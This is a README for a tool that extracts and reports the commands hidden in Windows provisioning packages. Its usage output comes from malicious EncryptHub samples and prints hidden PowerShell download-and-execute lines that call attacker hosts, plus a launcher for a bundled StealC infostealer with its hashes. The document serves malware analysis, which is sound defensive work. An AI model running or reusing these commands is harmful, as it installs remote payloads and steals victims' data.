# ppkg_happiness

https://www.youtube.com/watch?v=7xzU9Qqdqww

# install

pip3 install git+https://github.com/wmetcalf/ppkg_happiness.git

# usage

```
ppkg-happiness -i /home/coz/Downloads/merged_EncryptHub_QQ.ppkg -d dump -j dump.json
{
    "images": [
        {
            "index": 1,
            "ppkgMetadata": {
                "ID": "{0c19a3ad-3ed7-42db-a1b6-cde18ca7265b}",
                "Name": "EncryptHub",
                "Version": "1.1",
                "OwnerType": "Microsoft",
                "Rank": "0",
                "Notes": ""
            },
            "commands": [
                "calc.exe"
            ],
            "fileDetails": [
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/Multivariant/Multivariant.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/Multivariant/0/MasterDatastore.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/Multivariant/0/customizations.xml",
                    "commands": [
                        "calc.exe"
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "calc.exe",
                        "{0c19a3ad-3ed7-42db-a1b6-cde18ca7265b}EncryptHub1.1Microsoft0calc.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/Multivariant/0/Prov/RunTime.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/Multivariant/0/Prov/RunTime/0__ProvisioningCommands_DeviceContext_CommandLine.provxml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "calc.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/CommonSettings/CommonSettings.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/1/CommonSettings/1/AnswerFile.xml",
                    "commands": [
                        "calc.exe"
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "calc.exe"
                    ]
                }
            ],
            "copiedDataAssets": []
        },
        {
            "index": 2,
            "ppkgMetadata": {
                "ID": "{9313209b-46b6-4ec7-9f8e-25656c006459}",
                "Name": "EncryptHUB",
                "Version": "7.5",
                "OwnerType": "Microsoft",
                "Rank": "0",
                "Notes": ""
            },
            "commands": [
                "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://0xffsec.net/f7sjdjf2w1/payload/builds/qq.ps1' | Invoke-Expression\""
            ],
            "fileDetails": [
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/Multivariant/Multivariant.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/Multivariant/0/MasterDatastore.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/Multivariant/0/customizations.xml",
                    "commands": [
                        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://0xffsec.net/f7sjdjf2w1/payload/builds/qq.ps1' | Invoke-Expression\""
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "{9313209b-46b6-4ec7-9f8e-25656c006459}EncryptHUB7.5Microsoft0powershell.exe",
                        "powershell.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/Multivariant/0/Prov/RunTime.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/Multivariant/0/Prov/RunTime/0__ProvisioningCommands_DeviceContext_CommandLine.provxml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/CommonSettings/CommonSettings.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpjalaa4_u/2/CommonSettings/1/AnswerFile.xml",
                    "commands": [
                        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://0xffsec.net/f7sjdjf2w1/payload/builds/qq.ps1' | Invoke-Expression\""
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "powershell.exe"
                    ]
                }
            ],
            "copiedDataAssets": []
        }
    ]
}


coz@genesis:~/Downloads/ppkg_happiness$ ppkg-happiness -i /home/coz/Downloads/5f8f8a868b25435b37e632b4e4e3b23f24092cbf075d7c0d9b7b960615738c7c.ppkg -d dump -j dump.json
{
    "images": [
        {
            "index": 1,
            "ppkgMetadata": {
                "ID": "{b3d34711-69fa-4261-9465-4a8ba00bad54}",
                "Name": "Marko",
                "Version": "1.0",
                "OwnerType": "OEM",
                "Rank": "0",
                "Notes": ""
            },
            "commands": [
                "cmd /c \"stealc_xprivate28_0.exe\"",
                "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://encrypthub.net/main/zakrep/worker.ps1' | Invoke-Expression\""
            ],
            "fileDetails": [
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/Multivariant.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/MasterDatastore.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/customizations.xml",
                    "commands": [
                        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://encrypthub.net/main/zakrep/worker.ps1' | Invoke-Expression\"",
                        "cmd /c \"stealc_xprivate28_0.exe\""
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "powershell.exe",
                        "C:\\Users\\User\\Documents\\stealc_xprivate28_0.exe",
                        "{b3d34711-69fa-4261-9465-4a8ba00bad54}Marko1.0OEM0powershell.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/Prov/RunTime.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/Prov/RunTime/2__ProvisioningCommands_PrimaryContext_Command_0_CommandLine.provxml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/Prov/RunTime/1__ProvisioningCommands_PrimaryContext_Command_0_CommandFile.provxml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "0_VXR+X.W5UIis5ee1Kb0cAZCs+MI71MIPIVxCsCMjiFI=\\stealc_xprivate28_0.exe",
                        "stealc_xprivate28_0.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/Multivariant/0/Prov/RunTime/0__ProvisioningCommands_DeviceContext_CommandLine.provxml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/CommonSettings/CommonSettings.xml",
                    "commands": [],
                    "structuredDataAssets": [],
                    "dataAssetReferences": []
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/CommonSettings/1/AnswerFile.xml",
                    "commands": [
                        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'https://encrypthub.net/main/zakrep/worker.ps1' | Invoke-Expression\"",
                        "cmd /c \"stealc_xprivate28_0.exe\""
                    ],
                    "structuredDataAssets": [],
                    "dataAssetReferences": [
                        "powershell.exe",
                        "C:\\Users\\User\\Documents\\stealc_xprivate28_0.exe"
                    ]
                },
                {
                    "filePath": "/tmp/tmpwsbv9e7k/DataAsset/DataAsset.xml",
                    "commands": [],
                    "structuredDataAssets": [
                        {
                            "index": "2",
                            "metadata": {
                                "Name": "CommandFile",
                                "0_VXR+X.W5UIis5ee1Kb0cAZCs+MI71MIPIVxCsCMjiFI=\\stealc_xprivate28_0.exe": "/ProvisioningCommands/PrimaryContext/Command/0/CommandFile"
                            }
                        }
                    ],
                    "dataAssetReferences": [
                        "CommandFile",
                        "/ProvisioningCommands/PrimaryContext/Command/0/CommandFile",
                        "2",
                        "DataAsset",
                        "Name",
                        "0_VXR+X.W5UIis5ee1Kb0cAZCs+MI71MIPIVxCsCMjiFI=\\stealc_xprivate28_0.exe"
                    ]
                }
            ],
            "copiedDataAssets": [
                {
                    "reference": "stealc_xprivate28_0.exe",
                    "original_path": "/tmp/tmpwsbv9e7k/DataAsset/2/0_VXR+X.W5UIis5ee1Kb0cAZCs+MI71MIPIVxCsCMjiFI=/stealc_xprivate28_0.exe",
                    "copied_path": "dump/stealc_xprivate28_0_3.exe",
                    "md5": "56078814b6ce3536d4a4040e5dc3840a",
                    "sha1": "da7c81230f212e32dfc62de9114a4d0fb1c5930d",
                    "sha256": "55747e5ff5b95088ace5e7b529bd1c0190acf8c23bd4c20f215c42b023238852",
                    "mime_type": "application/x-dosexec"
                }
            ]
        }
    ]
}
```
